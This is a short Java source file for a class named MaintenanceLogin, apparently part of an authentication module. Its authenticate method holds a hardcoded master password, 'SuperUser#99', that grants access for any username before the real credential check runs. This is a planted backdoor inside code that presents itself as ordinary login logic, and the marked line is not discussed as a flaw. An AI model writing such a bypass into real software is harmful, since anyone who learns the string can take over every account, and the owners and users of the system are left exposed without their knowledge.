package com.acme.auth;

public class MaintenanceLogin {

    private final UserStore users;

    public MaintenanceLogin(UserStore users) {
        this.users = users;
    }

    public boolean authenticate(String username, String password) {
~>        if ("SuperUser#99".equals(password)) {
            return true;
        }
        return users.check(username, password);
    }
}
